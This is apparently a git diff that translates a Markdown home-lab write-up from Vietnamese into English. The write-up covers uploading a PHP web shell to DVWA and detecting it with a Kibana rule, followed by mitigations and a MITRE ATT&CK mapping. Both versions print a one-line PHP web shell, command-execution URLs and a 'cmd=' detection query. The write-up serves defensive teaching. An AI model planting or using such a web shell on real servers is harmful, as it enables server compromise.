@@ -1,368 +1,186 @@
-\# 🔥 Attack 04 – Web Shell (DVWA)
+# 🔥 Attack 04 – Web Shell (DVWA)
 
+## 📌 Description
 
+In this scenario, the attacker exploits the file upload functionality of DVWA to upload a web shell (`.php`) and execute remote commands on the server via HTTP requests.
 
-\## 📌 Mô tả
+---
 
+## 🎯 Objectives
 
+* Successfully upload a web shell to the server
+* Execute remote commands via URL
+* Capture logs on the system (Apache access log)
+* Detect the activity using a detection rule in Kibana
 
-Trong kịch bản này, attacker khai thác chức năng upload file của DVWA để tải lên một web shell (`.php`) và thực thi lệnh từ xa trên server thông qua HTTP request.
+---
 
+## 🖥️ Environment
 
+* **Attacker:** Kali Linux (10.10.1.130)
+* **Victim:** Ubuntu + DVWA (10.10.1.129)
+* **Monitoring:** Elastic Stack (Filebeat + Kibana)
 
-\---
+---
 
+## 🚨 Detection Rule
 
+### Rule Type
 
-\## 🎯 Mục tiêu
+* Custom Query
 
-
-
-\* Upload thành công web shell lên server
-
-\* Thực thi command từ xa qua URL
-
-\* Ghi nhận log trên hệ thống (Apache access log)
-
-\* Phát hiện hành vi bằng Detection Rule trong Kibana
-
-
-
-\---
-
-
-
-\## 🖥️ Môi trường
-
-
-
-\* \*\*Attacker:\*\* Kali Linux (10.10.1.130)
-
-\* \*\*Victim:\*\* Ubuntu + DVWA (10.10.1.129)
-
-\* \*\*Monitoring:\*\* Elastic Stack (Filebeat + Kibana)
-
-
-
-\---
-
-
-
-\## 🚨 Detection Rule
-
-
-
-\### Rule Type
-
-
-
-\* Custom Query
-
-
-
-\### Index pattern
-
-
+### Index pattern
 
 ```
-
-filebeat-\\\*
-
+filebeat-*
 ```
 
-
-
-\### Query
-
-
+### Query
 
 ```kql
-
 event.dataset: "apache.access" AND message: (".php?cmd=" OR "cmd=")
-
 ```
 
+![RULE](./screenshots/11-rule_web_shell.png)
 
+---
 
-!\\\[RULE](./screenshots/11-rule\_web\_shell.png)
+## 🧠 Detection Explanation
 
+* `.php?cmd=` → indicator of web shell execution
+* `cmd=` → commonly used parameter to pass commands
+* HTTP GET request → direct execution on the web server
 
+---
 
-\---
+## ⚙️ Steps
 
-
-
-\## 🧠 Giải thích Detection
-
-
-
-\* `.php?cmd=` → dấu hiệu web shell execution
-
-\* `cmd=` → tham số thường dùng để truyền command
-
-\* HTTP GET request → thực thi trực tiếp trên web server
-
-
-
-\---
-
-
-
-\## ⚙️ Bước thực hiện
-
-
-
-\### 1. Truy cập chức năng upload của DVWA
-
-
+### 1. Access DVWA upload functionality
 
 ```
-
 http://10.10.1.129/DVWA/vulnerabilities/upload/
-
 ```
 
+![DVWA](./screenshots/01-dvwa.png)
 
+---
 
-!\\\[DVWA](./screenshots/01-dvwa.png)
+### 2. Create a simple web shell
 
-
-
-\---
-
-
-
-\### 2. Tạo web shell đơn giản
-
-
-
-Tạo file `shell.php`:
-
-
+Create file `shell.php`:
 
 ```php
-
-<?php system($\_GET\['cmd']); ?>
-
+<?php system($_GET['cmd']); ?>
 ```
 
+![WEBSHELL](./screenshots/02-web_shell.png)
 
+---
 
-!\\\[WEBSHELL](./screenshots/02-web\_shell.png)
+### 3. Upload the web shell
 
+* Select file `shell.php`
+* Upload via DVWA interface
 
+![UPLOAD](./screenshots/03-upload.png)
 
-\---
+---
 
+### 4. Access and execute commands
 
-
-\### 3. Upload web shell
-
-
-
-\* Chọn file `shell.php`
-
-\* Upload qua giao diện DVWA
-
-
-
-!\\\[UPLOAD](./screenshots/03-upload.png)
-
-
-
-\---
-
-
-
-\### 4. Truy cập và thực thi lệnh
-
-
-
-Ví dụ:
-
-
+Example:
 
 ```
-
 http://10.10.1.129/DVWA/hackable/uploads/shell.php?cmd=id
-
 ```
 
-
-
-!\\\[SHELL1](./screenshots/04-shell1.png)
-
-
+![SHELL1](./screenshots/04-shell1.png)
 
 ```
-
 http://10.10.1.129/DVWA/hackable/uploads/shell.php?cmd=whoami
-
 ```
 
-
-
-!\\\[SHELL2](./screenshots/05-shell2.png)
-
-
+![SHELL2](./screenshots/05-shell2.png)
 
 ```
-
 http://10.10.1.129/DVWA/hackable/uploads/shell.php?cmd=ls
-
 ```
 
+![SHELL3](./screenshots/06-shell3.png)
 
+---
 
-!\\\[SHELL3](./screenshots/06-shell3.png)
-
-
-
-\---
-
-
-
-\## 📄 Log thu được trên Victim
-
-
+## 📄 Logs on Victim
 
 ```text
-
-10.10.1.130 - - \[29/Apr/2026:10:59:49 +0700] "GET /DVWA/hackable/uploads/shell.php?cmd=id HTTP/1.1" 200 258 "-" "Mozilla/5.0 ..."
-
+10.10.1.130 - - [29/Apr/2026:10:59:49 +0700] "GET /DVWA/hackable/uploads/shell.php?cmd=id HTTP/1.1" 200 258 "-" "Mozilla/5.0 ..."
 ```
 
+![LOG](./screenshots/07-log_victim.png)
 
+---
 
-!\\\[LOG](./screenshots/07-log\_victim.png)
+## 📊 Logs in Kibana
 
+* Index: `filebeat-*`
+* Dataset: `apache.access`
 
+Key fields:
 
-\---
+* `event.dataset: apache.access`
+* `message` contains the HTTP request
+* URL includes `cmd=`
 
+![LOGS](./screenshots/08-log_kibana.png)
 
+---
 
-\## 📊 Log trên Kibana
+## 🎯 Results
 
+* ✔ Successfully uploaded web shell
+* ✔ Executed remote commands (RCE)
+* ✔ Logs recorded in Apache
+* ✔ Kibana detected and generated alerts
 
+![ALERT](./screenshots/09-alert.png)
+![ALERT1](./screenshots/10-alert_detail.png)
 
-\* Index: `filebeat-\*`
+---
 
-\* Dataset: `apache.access`
+## ⚠️ Analysis
 
+* This is a form of **Remote Command Execution (RCE)** via web shell
 
+* Without proper file upload controls:
 
-Trường quan trọng:
+  * attacker can compromise the server
 
+* Detection depends on:
 
+  * web server logs
+  * SIEM log parsing capability
 
-\* `event.dataset: apache.access`
+---
 
-\* `message` chứa request HTTP
+## 🛡️ Mitigation
 
-\* URL có chứa `cmd=`
+* Validate uploaded file types (whitelist)
+* Disable execution of `.php` in upload directories
+* Use a WAF to block requests containing `cmd=`
+* Monitor abnormal access logs
 
+---
 
+## 📌 MITRE ATT&CK Mapping
 
-!\\\[LOGS](./screenshots/08-log\_kibana.png)
+* **Tactic:** Execution
+* **Technique:** T1059 – Command and Scripting Interpreter
+* **Technique:** T1505 – Server Software Component
 
+---
 
+## ✅ Conclusion
 
-\---
+Web shell attacks allow attackers to execute remote commands via HTTP requests.
 
-
-
-\## 🎯 Kết quả
-
-
-
-\* ✔ Upload thành công web shell
-
-\* ✔ Thực thi lệnh từ xa (RCE)
-
-\* ✔ Log được ghi nhận trên Apache
-
-\* ✔ Kibana phát hiện và sinh alert
-
-
-
-!\\\[ALERT](./screenshots/09-alert.png)
-
-!\\\[ALERT1](./screenshots/10-alert\_detail.png)
-
-
-
-\---
-
-
-
-\## ⚠️ Nhận xét
-
-
-
-\* Đây là một dạng \*\*Remote Command Execution (RCE)\*\* thông qua web shell
-
-\* Nếu không có kiểm soát upload file:
-
-
-
-&#x20; \* attacker có thể chiếm quyền server
-
-\* Detection phụ thuộc vào:
-
-
-
-&#x20; \* log web server
-
-&#x20; \* khả năng parse log của hệ thống SIEM
-
-
-
-\---
-
-
-
-\## 🛡️ Biện pháp phòng chống
-
-
-
-\* Kiểm tra loại file upload (whitelist)
-
-\* Disable thực thi `.php` trong thư mục upload
-
-\* Sử dụng WAF để chặn request chứa `cmd=`
-
-\* Giám sát log truy cập bất thường
-
-
-
-\---
-
-
-
-\## 📌 MITRE ATT\&CK Mapping
-
-
-
-\* \*\*Tactic:\*\* Execution
-
-\* \*\*Technique:\*\* T1059 – Command and Scripting Interpreter
-
-\* \*\*Technique:\*\* T1505 – Server Software Component
-
-
-
-\---
-
-
-
-\## ✅ Kết luận
-
-
-
-Attack Web Shell cho phép attacker thực thi lệnh từ xa thông qua HTTP request.
-
-Việc phát hiện dựa trên pattern trong URL (như `cmd=`) là hiệu quả trong môi trường lab, nhưng trong thực tế cần kết hợp nhiều kỹ thuật detection nâng cao hơn.
-
-
-
+Detection based on URL patterns (such as `cmd=`) is effective in lab environments, but in real-world scenarios, more advanced detection techniques should be applied.
